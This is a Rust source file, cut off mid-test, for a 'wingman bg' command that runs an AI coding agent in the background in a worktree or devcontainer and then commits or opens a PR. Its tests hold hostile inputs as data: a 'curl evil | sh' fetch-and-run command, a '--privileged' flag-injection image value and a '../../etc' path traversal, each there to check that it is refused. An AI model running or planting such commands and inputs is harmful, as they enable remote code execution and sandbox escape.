//! `wingman bg` — hand a task off, close the terminal, get a branch (or a PR)
//! back.
//!
//! `bg start` creates a worktree on a fresh `wingman/bg/<id>` branch off HEAD,
//! writes the run record to `.wingman/bg/<id>/`, and re-execs itself detached
//! (the spawn `pilot run -d` uses). The detached copy is the supervisor: it
//! runs `wingman --print --json --mode auto-edit` in the worktree — or inside
//! the repo's devcontainer image with the worktree mounted — appending events
//! to `events.jsonl`. When the agent exits 0 it commits the result on the
//! branch and, with `--pr`, opens a PR through pilot's PR code. The user's
//! checkout is never touched.
//!
//! What this is not: `pilot run -d` already detaches a *multi*-agent run
//! (planner, workers, integration branch, PR). `bg` is the single-agent shape:
//! one prompt, one agent, one branch. And it needs nothing for remote use:
//! `--remote` forwards any clap subcommand to `wingman serve`, so `wingman
//! --remote <url> bg start …` runs on the server as it stands.

use std::path::{Component, Path, PathBuf};
use std::process::{ExitCode, Stdio};
use std::time::{Duration, Instant};

use anyhow::{anyhow, bail, Context, Result};
use serde::{Deserialize, Serialize};
use wingman_config::{PermissionMode, PilotSandboxConfig, ProjectPaths};

/// Set on the detached re-exec: "you are the supervisor for this run".
const ID_ENV: &str = "WINGMAN_BG_ID";
/// How long `bg stop` waits for the supervisor to act on the stop request.
const STOP_WAIT: Duration = Duration::from_secs(15);

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
enum Status {
    Starting,
    Running,
    Done,
    Failed,
    Stopped,
}

impl Status {
    fn as_str(self) -> &'static str {
        match self {
            Self::Starting => "starting",
            Self::Running => "running",
            Self::Done => "done",
            Self::Failed => "failed",
            Self::Stopped => "stopped",
        }
    }

    fn finished(self) -> bool {
        matches!(self, Self::Done | Self::Failed | Self::Stopped)
    }
}

/// `.wingman/bg/<id>/state.json`. Written by `bg start` until the supervisor
/// takes over, then only by the supervisor — except that `bg stop` records a
/// run whose supervisor is already gone.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct BgRun {
    id: String,
    prompt: String,
    branch: String,
    worktree: PathBuf,
    pr: bool,
    devcontainer: bool,
    model: Option<String>,
    created: String,
    status: Status,
    /// The supervisor's pid, recorded by the supervisor itself.
    pid: Option<u32>,
    exit: Option<i32>,
    commit: Option<String>,
    pr_url: Option<String>,
    note: Option<String>,
}

/// The branch a run's work lands on.
fn branch_for(id: &str) -> String {
    format!("wingman/bg/{id}")
}

/// Ids are minted as `YYYY-MM-DD-HHMM-<rand6>`; anything a user types is held
/// to that alphabet, since it becomes a path segment and a ref name.
fn valid_id(id: &str) -> bool {
    !id.is_empty()
        && id.len() <= 64
        && id
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
}

fn container_name(id: &str) -> String {
    format!("wingman-bg-{id}")
}

fn bg_root(project: &ProjectPaths) -> PathBuf {
    project.dir.join("bg")
}

fn run_dir(project: &ProjectPaths, id: &str) -> Result<PathBuf> {
    if !valid_id(id) {
        bail!("'{id}' is not a bg run id (see `wingman bg list`)");
    }
    Ok(bg_root(project).join(id))
}

fn load(dir: &Path) -> Result<BgRun> {
    let path = dir.join("state.json");
    let text = std::fs::read_to_string(&path)
        .with_context(|| format!("no bg run at {} (see `wingman bg list`)", dir.display()))?;
    serde_json::from_str(&text).with_context(|| format!("parsing {}", path.display()))
}

/// Write-then-rename, so `bg list` never reads half a file.
fn save(dir: &Path, run: &BgRun) -> Result<()> {
    let tmp = dir.join("state.json.tmp");
    std::fs::write(&tmp, serde_json::to_vec_pretty(run)?)
        .with_context(|| format!("writing {}", tmp.display()))?;
    std::fs::rename(&tmp, dir.join("state.json")).context("replacing state.json")
}

/// The status to show: a run that claims to be live but whose supervisor is
/// gone (crash, reboot, `kill -9`) reads as `died`, not `running` forever.
fn status_label(run: &BgRun, alive: impl Fn(u32) -> bool) -> &'static str {
    match (run.status, run.pid) {
        (Status::Starting | Status::Running, Some(pid)) if !alive(pid) => "died",
        (s, _) => s.as_str(),
    }
}

/// A server's permission ceiling reaches `bg start` as `--mode`. A run edits
/// files, so it runs in auto-edit — never above, and refused below.
fn check_mode(mode: Option<PermissionMode>) -> Result<()> {
    use crate::serve::rank;
    match mode {
        Some(m) if rank(m) < rank(PermissionMode::AutoEdit) => bail!(
            "bg runs edit files in auto-edit, and --mode {m} is below that \
             (over --remote this is the server's permission ceiling)"
        ),
        _ => Ok(()),
    }
}

fn git(root: &Path, args: &[&str]) -> Result<String> {
    let out = std::process::Command::new("git")
        .arg("-C")
        .arg(root)
        .args(args)
        .output()
        .context("running git")?;
    if !out.status.success() {
        bail!(
            "git {} failed: {}",
            args.first().copied().unwrap_or_default(),
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
}

/// Best-effort removal of a worktree and its branch.
fn discard(root: &Path, worktree: &Path, branch: Option<&str>) {
    let _ = std::process::Command::new("git")
        .arg("-C")
        .arg(root)
        .args(["worktree", "remove", "--force"])
        .arg(worktree)
        .output();
    if let Some(b) = branch {
        let _ = git(root, &["branch", "-D", b]);
    }
}

/// `bg start "<prompt>"`. In the detached re-exec (`WINGMAN_BG_ID` set) this
/// is the supervisor instead.
pub async fn start(
    prompt: String,
    pr: bool,
    devcontainer: bool,
    mode: Option<PermissionMode>,
    model: Option<String>,
) -> Result<ExitCode> {
    check_mode(mode)?;
    let project = ProjectPaths::discover(&std::env::current_dir()?);
    if let Ok(id) = std::env::var(ID_ENV) {
        return supervise(&project, &id).await;
    }
    if prompt.trim().is_empty() {
        bail!("bg start needs a prompt");
    }
    if devcontainer
        && !wingman_autonomous::sandbox::docker_available(
            &wingman_autonomous::pr::SystemCommandRunner,
        )
    {
        bail!(
            "--devcontainer needs Docker: `docker` is not on PATH or its daemon is not reachable \
             (`wingman doctor` checks this)"
        );
    }

    let base = git(&project.root, &["rev-parse", "HEAD"])
        .context("bg start needs a git repository with at least one commit")?;
    let id = crate::commands::pilot::new_run_id();
    let branch = branch_for(&id);
    let worktree = project.dir.join("worktrees").join(format!("bg-{id}"));
    git(
        &project.root,
        &[
            "worktree",
            "add",
            "-b",
            &branch,
            &worktree.to_string_lossy(),
            &base,
        ],
    )?;

    // From here a failure would strand the worktree and branch; take them back.
    let dir = bg_root(&project).join(&id);
    let launched = (|| -> Result<u32> {
        if devcontainer {
            // Fail in the terminal, not in a log nobody is reading yet.
            devcontainer_spec(&worktree)?;
        }
        std::fs::create_dir_all(&dir).with_context(|| format!("creating {}", dir.display()))?;
        save(
            &dir,
            &BgRun {
                id: id.clone(),
                prompt,
                branch: branch.clone(),
                worktree: worktree.clone(),
                pr,
                devcontainer,
                model,
                created: chrono::Utc::now().to_rfc3339(),
                status: Status::Starting,
                pid: None,
                exit: None,
                commit: None,
                pr_url: None,
                note: None,
            },
        )?;
        let child = crate::commands::pilot::spawn_self_detached(
            std::env::args_os().skip(1),
            &[(ID_ENV, &id)],
            &dir.join("bg.log"),
        )
        .context("spawning the background supervisor")?;
        Ok(child.id())
    })();
    let pid = match launched {
        Ok(pid) => pid,
        Err(e) => {
            discard(&project.root, &worktree, Some(&branch));
            let _ = std::fs::remove_dir_all(&dir);
            return Err(e);
        }
    };

    println!("[bg] {id} started on {branch} (pid {pid})");
    println!("[bg] logs:  wingman bg logs {id} --follow");
    println!("[bg] stop:  wingman bg stop {id}");
    Ok(ExitCode::SUCCESS)
}

/// The detached half: run the agent, then commit / PR / record the outcome.
async fn supervise(project: &ProjectPaths, id: &str) -> Result<ExitCode> {
    let dir = run_dir(project, id)?;
    let mut run = load(&dir)?;
    if run.status != Status::Starting {
        bail!("bg run {id} is already {}", run.status.as_str());
    }
    run.status = Status::Running;
    run.pid = Some(std::process::id());
    save(&dir, &run)?;
    // A SIGTERM / Ctrl+C to the supervisor still tree-kills the agent.
    crate::shutdown::install();

    if let Err(e) = drive(project, &dir, &mut run).await {
        run.status = Status::Failed;
        run.note = Some(format!("{e:#}"));
        note(&dir, &format!("failed: {e:#}"));
    }
    save(&dir, &run)?;
    Ok(ExitCode::SUCCESS)
}

/// Append a supervisor line to `events.jsonl`, in the same NDJSON shape as the
/// agent's events so `bg logs` reads one stream. Only written while no agent
/// is running, so the two writers never interleave.
fn note(dir: &Path, message: &str) {
    use std::io::Write as _;
    let line = serde_json::json!({ "type": "bg", "message": message });
    if let Ok(mut f) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(dir.join("events.jsonl"))
    {
        let _ = writeln!(f, "{line}");
    }
}

async fn drive(project: &ProjectPaths, dir: &Path, run: &mut BgRun) -> Result<()> {
    let stop = dir.join("stop");
    if stop.exists() {
        run.status = Status::Stopped;
        return Ok(());
    }
    let cfg = crate::cli::load_config()?;
    let events = || -> Result<Stdio> {
        Ok(std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(dir.join("events.jsonl"))
            .context("opening events.jsonl")?
            .into())
    };

    let mut image_tag = None;
    let cmd = if run.devcontainer {
        let image = match devcontainer_spec(&run.worktree)? {
            Devcontainer::Image(image) => image,
            Devcontainer::Build {
                dockerfile,
                context,
            } => {
                let tag = container_name(&run.id);
                note(dir, &format!("docker build {}", dockerfile.display()));
                let mut build = tokio::process::Command::new("docker");
                build
                    .arg("build")
                    .arg("-f")
                    .arg(&dockerfile)
                    .arg("-t")
                    .arg(&tag)
                    .arg(&context)
                    // Build output goes to bg.log, keeping events.jsonl NDJSON.
                    .stdin(Stdio::null());
                image_tag = Some(tag.clone());
                match run_until_stopped(build, &stop).await? {
                    Some(0) => {}
                    None => {
                        run.status = Status::Stopped;
                        return Ok(());
                    }
                    Some(c) => bail!("docker build exited {c}; see bg.log"),
                }
                tag
            }
        };
        let selection = crate::runtime::resolve_selection(&cfg, run.model.as_deref())?;
        // The container gets no `~/.wingman`: the one provider key it needs
        // arrives as `WINGMAN_<PROVIDER>_API_KEY`, set on the `docker run`
        // client and forwarded by name, so the value never reaches argv.
        let key_env = format!(
            "WINGMAN_{}_API_KEY",
            selection.provider_id.to_ascii_uppercase()
        );
        let key = cfg
            .providers
            .get(&selection.provider_id)
            .and_then(|pc| crate::runtime::check_config_value(pc.api_key.as_deref()))
            .or_else(|| {
                crate::runtime::api_key_env_var(&selection.provider_id)
                    .and_then(|name| std::env::var(name).ok())
            });
        let argv = container_command(
            &cfg.pilot.sandbox,
            &run.worktree,
            &run.id,
            &image,
            &run.prompt,
            &selection.spec(),
            key.is_some().then_some(key_env.as_str()),
        );
        note(dir, &format!("started in devcontainer image {image}"));
        let mut c = tokio::process::Command::new("docker");
        c.args(&argv);
        if let Some(k) = key {
            c.env(&key_env, k);
        }
        c
    } else {
        note(dir, "started on host");
        let mut c = tokio::process::Command::new(std::env::current_exe()?);
        c.args(agent_args(&run.prompt, run.model.as_deref()))
            .current_dir(&run.worktree);
        c
    };
    let mut cmd = cmd;
    // The agent must not mistake itself for a supervisor if it runs `wingman`.
    cmd.env_remove(ID_ENV)
        .stdin(Stdio::null())
        .stdout(events()?);

    let code = run_until_stopped(cmd, &stop).await;
    if run.devcontainer {
        // `--rm` covers a clean exit; a killed `docker run` client leaves the
        // container behind.
        let _ = std::process::Command::new("docker")
            .args(["rm", "-f", &container_name(&run.id)])
            .output();
        if let Some(tag) = &image_tag {
            let _ = std::process::Command::new("docker")
                .args(["image", "rm", tag])
                .output();
        }
    }
    let code = match code? {
        Some(c) => c,
        None => {
            run.status = Status::Stopped;
            note(dir, "stopped");
            return Ok(());
        }
    };
    run.exit = Some(code);
    let kept = run.worktree.display().to_string();
    match code {
        0 => {}
        2 => {
            run.status = Status::Failed;
            run.note = Some(format!(
                "verification gate red; changes left uncommitted in {kept}"
            ));
            note(dir, run.note.as_deref().unwrap_or_default());
            return Ok(());
        }
        c => {
            run.status = Status::Failed;
            run.note = Some(format!("agent exited {c}; worktree kept at {kept}"));
            note(dir, run.note.as_deref().unwrap_or_default());
            return Ok(());
        }
    }

    let title = first_line(&run.prompt, 68);
    let message = format!("{title}\n\nwingman bg run {}", run.id);
    let Some(sha) = wingman_autonomous::worktree::commit_checkpoint(&run.worktree, &message)?
    else {
        run.status = Status::Done;
        run.note = Some("the agent made no changes".into());
        note(dir, "done: no changes");
        discard(&project.root, &run.worktree, Some(&run.branch));
        return Ok(());
    };
    note(dir, &format!("committed {sha} on {}", run.branch));
    run.commit = Some(sha);
    run.status = Status::Done;

    if run.pr {
        let body = format!(
            "## Prompt\n\n{}\n\n_Opened by `wingman bg`. Run id: `{}`._",
            run.prompt, run.id
        );
        match wingman_autonomous::pr::open_pr(
            &wingman_autonomous::pr::SystemCommandRunner,
            &project.root,
            &cfg.pilot.pr.base_branch,
            &run.branch,
            &format!("bg: {title}"),
            &body,
            None,
        ) {
            Ok(outcome) => {
                note(dir, &format!("PR: {}", outcome.url));
                run.pr_url = Some(outcome.url);
            }
            Err(e) => {
                run.note = Some(format!("committed, but the PR step failed: {e}"));
                note(dir, run.note.as_deref().unwrap_or_default());
            }
        }
    }
    // The work is on the branch now; the checkout it was made in can go.
    discard(&project.root, &run.worktree, None);
    Ok(())
}

/// Run `cmd` with tree-kill supervision until it exits (`Some(code)`) or a
/// stop request appears (`None`, after the tree is killed).
async fn run_until_stopped(cmd: tokio::process::Command, stop: &Path) -> Result<Option<i32>> {
    let mut sup = wingman_autonomous::child_process::SupervisedCommand::from_command(cmd)
        .spawn()
        .context("spawning the agent")?;
    let mut child = sup.take_child().context("supervised child has no handle")?;
    loop {
        tokio::select! {
            status = child.wait() => return Ok(Some(status?.code().unwrap_or(-1))),
            _ = tokio::time::sleep(Duration::from_millis(500)) => {
                if stop.exists() {
                    let _ = sup.signal_kill();
                    let _ = child.wait().await;
                    return Ok(None);
                }
            }
        }
    }
}

/// The headless invocation, as the agent sees it. `--print=` keeps a prompt
/// that starts with `-` from reading as a flag.
fn agent_args(prompt: &str, model: Option<&str>) -> Vec<String> {
    let mut a = vec![
        format!("--print={prompt}"),
        "--json".into(),
        "--mode".into(),
        "auto-edit".into(),
    ];
    if let Some(m) = model {
        a.extend(["--model".into(), m.into()]);
    }
    a
}

/// `docker run` argv for a devcontainer run: the sandbox tier's limits and
/// argv builder, the worktree itself mounted, and only `key_env` forwarded.
fn container_command(
    limits: &PilotSandboxConfig,
    worktree: &Path,
    id: &str,
    image: &str,
    prompt: &str,
    model_spec: &str,
    key_env: Option<&str>,
) -> Vec<String> {
    let mut cfg = limits.clone();
    cfg.env = key_env.map(|k| vec![k.to_string()]).unwrap_or_default();
    let mut command = vec!["wingman".to_string()];
    command.extend(agent_args(prompt, Some(model_spec)));
    wingman_autonomous::sandbox::container_argv(
        &cfg,
        worktree,
        &container_name(id),
        wingman_autonomous::sandbox::owner_of(worktree),
        image,
        &command,
    )
}

fn first_line(s: &str, max: usize) -> String {
    let line = s
        .lines()
        .find(|l| !l.trim().is_empty())
        .unwrap_or("")
        .trim();
    if line.chars().count() <= max {
        return line.to_string();
    }
    let mut out: String = line.chars().take(max - 1).collect();
    out.push('…');
    out
}

/// `bg list`.
pub async fn list() -> Result<ExitCode> {
    let project = ProjectPaths::discover(&std::env::current_dir()?);
    let runs = load_all(&bg_root(&project));
    if runs.is_empty() {
        println!("no background runs (start one with `wingman bg start \"<prompt>\"`)");
    }
    for run in runs {
        let label = status_label(&run, crate::commands::indexd::process_alive);
        println!(
            "{}  {label:<8}  {}  {}",
            run.id,
            run.branch,
            first_line(&run.prompt, 50)
        );
        if let Some(extra) = run.pr_url.as_ref().or(run.note.as_ref()) {
            println!("    {extra}");
        }
    }
    Ok(ExitCode::SUCCESS)
}

/// Every readable run under `root`, newest first (ids start with a timestamp).
fn load_all(root: &Path) -> Vec<BgRun> {
    let mut runs: Vec<BgRun> = std::fs::read_dir(root)
        .into_iter()
        .flatten()
        .flatten()
        .filter_map(|e| load(&e.path()).ok())
        .collect();
    runs.sort_by(|a, b| b.id.cmp(&a.id));
    runs
}

/// `bg logs <id> [--follow]`.
pub async fn logs(id: String, follow: bool) -> Result<ExitCode> {
    use std::io::{Read as _, Seek as _, Write as _};
    let project = ProjectPaths::discover(&std::env::current_dir()?);
    let dir = run_dir(&project, &id)?;
    load(&dir)?;
    let path = dir.join("events.jsonl");
    let mut offset = 0u64;
    let mut pending = String::new();
    let mut stdout = std::io::stdout();
    loop {
        let mut buf = Vec::new();
        if let Ok(mut f) = std::fs::File::open(&path) {
            f.seek(std::io::SeekFrom::Start(offset))?;
            f.read_to_end(&mut buf)?;
        }
        offset += buf.len() as u64;
        pending.push_str(&String::from_utf8_lossy(&buf));
        while let Some(i) = pending.find('\n') {
            if let Some(text) = render(&pending[..i]) {
                write!(stdout, "{text}")?;
            }
            pending.drain(..=i);
        }
        stdout.flush()?;
        let run = load(&dir)?;
        let label = status_label(&run, crate::commands::indexd::process_alive);
        let over = run.status.finished() || label == "died";
        // A read that came back empty after the run finished is the last one.
        if !follow || (over && buf.is_empty()) {
            println!("\n[bg] {id}: {label}");
            return Ok(ExitCode::SUCCESS);
        }
        tokio::time::sleep(Duration::from_millis(500)).await;
    }
}

/// One `events.jsonl` line as `bg logs` shows it; `None` for the event kinds
/// that are noise to a reader (usage, turn boundaries).
fn render(line: &str) -> Option<String> {
    let Ok(ev) = serde_json::from_str::<serde_json::Value>(line) else {
        return Some(format!("{line}\n"));
    };
    let s = |k: &str| ev[k].as_str().unwrap_or_default().to_string();
    Some(match ev["type"].as_str()? {
        "text_delta" => s("text"),
        "tool_start" => format!("\n[tool] {}\n", s("name")),
        "verification" => {
            let mark = if ev["passed"].as_bool() == Some(true) {
                "✓"
            } else {
                "✗"
            };
            format!("\n[verify {mark}] {}\n", s("summary"))
        }
        "error" => format!("\n[error] {}\n", s("message")),
        "bg" => format!("\n[bg] {}\n", s("message")),
        _ => return None,
    })
}

/// `bg stop <id>`.
pub async fn stop(id: String) -> Result<ExitCode> {
    let project = ProjectPaths::discover(&std::env::current_dir()?);
    let dir = run_dir(&project, &id)?;
    let (run, stopped) = stop_in(&dir, crate::commands::indexd::process_alive).await?;
    if !stopped {
        eprintln!(
            "wingman: asked bg run {id} to stop, but its supervisor (pid {}) is still running after {}s",
            run.pid.unwrap_or_default(),
            STOP_WAIT.as_secs()
        );
        return Ok(ExitCode::FAILURE);
    }
    println!("[bg] {id}: {}", run.status.as_str());
    if run.worktree.exists() {
        println!("[bg] worktree kept at {}", run.worktree.display());
    }
    Ok(ExitCode::SUCCESS)
}

/// Ask the supervisor to stop and wait for it. A supervisor that is already
/// gone cannot record anything, so the run is marked stopped here. Returns the
/// final record and whether the run is no longer live.
async fn stop_in(dir: &Path, alive: impl Fn(u32) -> bool) -> Result<(BgRun, bool)> {
    let run = load(dir)?;
    if run.status.finished() {
        return Ok((run, true));
    }
    std::fs::write(dir.join("stop"), "").context("writing the stop request")?;
    let deadline = Instant::now() + STOP_WAIT;
    while run.pid.is_some_and(&alive) && Instant::now() < deadline {
        tokio::time::sleep(Duration::from_millis(250)).await;
    }
    if run.pid.is_some_and(&alive) {
        return Ok((run, false));
    }
    let mut run = load(dir)?;
    if !run.status.finished() {
        run.status = Status::Stopped;
        run.note = Some("stopped; the supervisor was not running".into());
        save(dir, &run)?;
        if run.devcontainer {
            let _ = std::process::Command::new("docker")
                .args(["rm", "-f", &container_name(&run.id)])
                .output();
        }
    }
    Ok((run, true))
}

/// What `.devcontainer/devcontainer.json` asks for, of the two shapes `bg`
/// supports.
#[derive(Debug, PartialEq, Eq)]
pub enum Devcontainer {
    Image(String),
    Build {
        dockerfile: PathBuf,
        context: PathBuf,
    },
}

impl std::fmt::Display for Devcontainer {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Image(i) => write!(f, "image {i}"),
            Self::Build { dockerfile, .. } => write!(f, "build {}", dockerfile.display()),
        }
    }
}

/// Keys that describe the editor, not the container, so ignoring them changes
/// nothing about where the agent runs.
const IGNORED_KEYS: &[&str] = &["$schema", "name", "customizations"];

/// Read and check `<root>/.devcontainer/devcontainer.json`.
pub fn devcontainer_spec(root: &Path) -> Result<Devcontainer> {
    let file = root.join(".devcontainer").join("devcontainer.json");
    let text = std::fs::read_to_string(&file).with_context(|| {
        format!(
            "reading {} (--devcontainer needs a committed .devcontainer/devcontainer.json)",
            file.display()
        )
    })?;
    parse_devcontainer(&text, root)
}

/// The file is repo content — possibly a repo you just cloned — so paths must
/// stay inside `root` and the image must not be able to pose as a docker flag.
/// Anything outside the supported subset is refused by name rather than
/// silently dropped: a `postCreateCommand` or `features` that did not run
/// would leave the agent in a different environment than the file promises.
fn parse_devcontainer(text: &str, root: &Path) -> Result<Devcontainer> {
    let value: serde_json::Value =
        serde_json::from_str(&strip_jsonc(text)).context("devcontainer.json is not valid JSONC")?;
    let obj = value
        .as_object()
        .ok_or_else(|| anyhow!("devcontainer.json must be a JSON object"))?;
    let unsupported = |key: &str| {
        anyhow!(
            "devcontainer.json: unsupported key \"{key}\" — `bg --devcontainer` supports only \
             \"image\" and \"build.dockerfile\" (with optional \"build.context\")"
        )
    };
    if let Some(key) = obj
        .keys()
        .find(|k| !["image", "build"].contains(&k.as_str()) && !IGNORED_KEYS.contains(&k.as_str()))
    {
        return Err(unsupported(key));
    }
    let dc_dir = root.join(".devcontainer");
    match (obj.get("image"), obj.get("build")) {
        (Some(_), Some(_)) => bail!("devcontainer.json: set \"image\" or \"build\", not both"),
        (Some(image), None) => {
            let image = image
                .as_str()
                .ok_or_else(|| anyhow!("devcontainer.json: \"image\" must be a string"))?;
            if image.is_empty() || image.starts_with('-') || image.chars().any(char::is_whitespace)
            {
                bail!("devcontainer.json: \"{image}\" is not an image reference");
            }
            Ok(Devcontainer::Image(image.to_string()))
        }
        (None, Some(build)) => {
            let build = build
                .as_object()
                .ok_or_else(|| anyhow!("devcontainer.json: \"build\" must be an object"))?;
            if let Some(key) = build
                .keys()
                .find(|k| !["dockerfile", "context"].contains(&k.as_str()))
            {
                return Err(unsupported(&format!("build.{key}")));
            }
            let field = |key: &str| -> Result<Option<&str>> {
                build
                    .get(key)
                    .map(|v| {
                        v.as_str().ok_or_else(|| {
                            anyhow!("devcontainer.json: \"build.{key}\" must be a string")
                        })
                    })
                    .transpose()
            };
            let dockerfile = field("dockerfile")?
                .ok_or_else(|| anyhow!("devcontainer.json: \"build\" needs a \"dockerfile\""))?;
            // Both are relative to the devcontainer.json's folder, per the spec.
            Ok(Devcontainer::Build {
                dockerfile: inside(root, &dc_dir, dockerfile)?,
                context: inside(root, &dc_dir, field("context")?.unwrap_or("."))?,
            })
        }
        (None, None) => {
            bail!("devcontainer.json has neither \"image\" nor \"build.dockerfile\"")
        }
    }
}

/// `rel` resolved lexically against `base`, refused if it leaves `root`.
// ponytail: lexical only; a symlink inside the repo can still point out. Fine
// for a file the user opted into with --devcontainer; canonicalize if bg ever
// reads devcontainer.json without that opt-in.
fn inside(root: &Path, base: &Path, rel: &str) -> Result<PathBuf> {
    let mut out = base.to_path_buf();
    for c in Path::new(rel).components() {
        match c {
            Component::Normal(p) => out.push(p),
            Component::CurDir => {}
            Component::ParentDir => {
                out.pop();
            }
            _ => bail!("devcontainer.json: \"{rel}\" must be a relative path"),
        }
    }
    if !out.starts_with(root) {
        bail!("devcontainer.json: \"{rel}\" points outside the repository");
    }
    Ok(out)
}

/// JSONC → JSON: drop `//` and `/* */` comments and trailing commas, leaving
/// string contents alone.
fn strip_jsonc(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    let mut in_str = false;
    while let Some(c) = chars.next() {
        if in_str {
            out.push(c);
            if c == '\\' {
                if let Some(n) = chars.next() {
                    out.push(n);
                }
            } else if c == '"' {
                in_str = false;
            }
            continue;
        }
        match (c, chars.peek()) {
            ('"', _) => {
                in_str = true;
                out.push(c);
            }
            ('/', Some('/')) => {
                while chars.peek().is_some_and(|n| *n != '\n') {
                    chars.next();
                }
            }
            ('/', Some('*')) => {
                chars.next();
                let mut prev = '\0';
                for n in chars.by_ref() {
                    if prev == '*' && n == '/' {
                        break;
                    }
                    prev = n;
                }
                out.push(' ');
            }
            ('}' | ']', _) => {
                // Outside a string, a last non-space `,` is structural.
                let end = out.trim_end().len();
                if out[..end].ends_with(',') {
                    out.truncate(end - 1);
                }
                out.push(c);
            }
            _ => out.push(c),
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn root() -> PathBuf {
        if cfg!(windows) {
            PathBuf::from(r"C:\repo")
        } else {
            PathBuf::from("/repo")
        }
    }

    #[test]
    fn jsonc_comments_and_trailing_commas_are_stripped_but_strings_are_not() {
        let text = r#"{
            // line comment
            "image": "mcr.microsoft.com/devcontainers/rust:1", /* block */
            "name": "a // not a comment, /* nor this */",
            "customizations": { "vscode": { "extensions": ["x",], }, },
        }"#;
        let v: serde_json::Value = serde_json::from_str(&strip_jsonc(text)).unwrap();
        assert_eq!(v["name"], "a // not a comment, /* nor this */");
        assert_eq!(
            parse_devcontainer(text, &root()).unwrap(),
            Devcontainer::Image("mcr.microsoft.com/devcontainers/rust:1".into())
        );
        // An escaped quote does not end the string.
        let v: serde_json::Value =
            serde_json::from_str(&strip_jsonc(r#"{"a": "x\" // y"}"#)).unwrap();
        assert_eq!(v["a"], "x\" // y");
    }

    #[test]
    fn build_dockerfile_resolves_against_the_devcontainer_folder() {
        let spec = parse_devcontainer(
            r#"{ "build": { "dockerfile": "Dockerfile", "context": ".." } }"#,
            &root(),
        )
        .unwrap();
        assert_eq!(
            spec,
            Devcontainer::Build {
                dockerfile: root().join(".devcontainer").join("Dockerfile"),
                context: root(),
            }
        );
        let Devcontainer::Build { context, .. } =
            parse_devcontainer(r#"{ "build": { "dockerfile": "D" } }"#, &root()).unwrap()
        else {
            panic!("expected a build");
        };
        assert_eq!(context, root().join(".devcontainer"));
    }

    #[test]
    fn unsupported_and_malformed_files_are_refused_by_name() {
        let err = |text: &str| format!("{:#}", parse_devcontainer(text, &root()).unwrap_err());
        let e = err(r#"{ "image": "x", "postCreateCommand": "curl evil | sh" }"#);
        assert!(e.contains("unsupported key \"postCreateCommand\""), "{e}");
        assert!(err(r#"{ "build": { "dockerfile": "D", "args": {} } }"#)
            .contains("unsupported key \"build.args\""));
        assert!(err(r#"{ "image": "x", "build": { "dockerfile": "D" } }"#).contains("not both"));
        assert!(err(r#"{ "name": "only a name" }"#).contains("neither"));
        assert!(err(r#"{ "build": {} }"#).contains("needs a \"dockerfile\""));
        assert!(err(r#"{ "image": "--privileged" }"#).contains("not an image reference"));
        assert!(
            err(r#"{ "build": { "dockerfile": "../../etc/Dockerfile" } }"#)
                .contains("outside the repository")
        );
        assert!(err("[1, 2]").contains("object"));
        assert!(err("{ nope").contains("JSONC"));
    }

    #[test]
    fn container_argv_forwards_only_the_key_name_and_keeps_limits() {
        let limits = PilotSandboxConfig {
            cpus: 3,
            memory_mib: 1024,
            env: vec!["SOMETHING_ELSE".into()],
            ..Default::default()
        };
        let wt = root().join(".wingman").join("worktrees").join("bg-x");
        let argv = container_command(
            &limits,
            &wt,
            "2026-09-15-1200-abc123",
            "rust:1",
            "-fix the bug",
            "anthropic/claude-opus-4-7",
            Some("WINGMAN_ANTHROPIC_API_KEY"),
        );
        let after = |flag: &str| argv[argv.iter().position(|a| a == flag).unwrap() + 1].clone();
        assert_eq!(after("--name"), "wingman-bg-2026-09-15-1200-abc123");
        assert_eq!(after("--cpus"), "3");
        assert_eq!(after("--memory"), "1024m");
        assert_eq!(after("-e"), "WINGMAN_ANTHROPIC_API_KEY");
        assert!(!argv.iter().any(|a| a == "SOMETHING_ELSE"));
        assert_eq!(after("-v"), format!("{}:/work", wt.display()));
        let image = argv.iter().position(|a| a == "rust:1").unwrap();
        assert_eq!(
            &argv[image + 1..],
            [
                "wingman",
                "--print=-fix the bug",
                "--json",
                "--mode",
                "auto-edit",
                "--model",
                "anthropic/claude-opus-4-7"
            ]
        );
        // A local provider has no key, and nothing is forwarded.
        let keyless = container_command(&limits, &wt, "i", "rust:1", "p", "ollama/x", None);
        assert!(!keyless.iter().any(|a| a == "-e"));
    }

    #[test]
    fn host_args_run_headless_in_auto_edit() {
        assert_eq!(
            agent_args("do it", None),
            ["--print=do it", "--json", "--mode", "auto-edit"]
        );
        assert_eq!(agent_args("p", Some("m")).last().unwrap(), "m");
    }

    #[test]
    fn ids_and_branches() {
        let id = crate::commands::pilot::new_run_id();
        assert!(valid_id(&id), "{id}");
        assert_eq!(branch_for(&id), format!("wingman/bg/{id}"));
        for bad in ["", "../x", "A", "a/b", "a b", &"a".repeat(65)] {
            assert!(!valid_id(bad), "{bad:?}");
        }
    }

    #[test]
    fn a_mode_below_auto_edit_is_refused() {
        assert!(check_mode(None).is_ok());
        assert!(check_mode(Some(PermissionMode::AutoEdit)).is_ok());
        assert!(check_mode(Some(PermissionMode::Yolo)).is_ok());
        assert!(check_mode(Some(PermissionMode::ReadOnly)).is_err());
        assert!(check_mode(Some(PermissionMode::Plan)).is_err());
    }

    fn record(dir: &Path, id: &str, status: Status, pid: Option<u32>) -> BgRun {
        let run = BgRun {
            id: id.into(),
            prompt: "fix it".into(),
            branch: branch_for(id),
            worktree: dir.join("wt"),
            pr: false,
            devcontainer: false,
            model: None,
            created: String::new(),
            status,
            pid,
            exit: None,
            commit: None,
            pr_url: None,
            note: None,
        };
        let d = dir.join(id);
        std::fs::create_dir_all(&d).unwrap();
        save(&d, &run).unwrap();
        run
    }

    #[test]
    fn a_live_run_whose_supervisor_is_gone_reads_as_died() {
        let dir = tempfile::tempdir().unwrap();
        let running = record(dir.path(), "a", Status::Running, Some(7));
        assert_eq!(status_label(&running, |_| true), "running");
        assert_eq!(status_label(&running, |_| false), "died");
        let done = record(dir.path(), "b", Status::Done, Some(7));
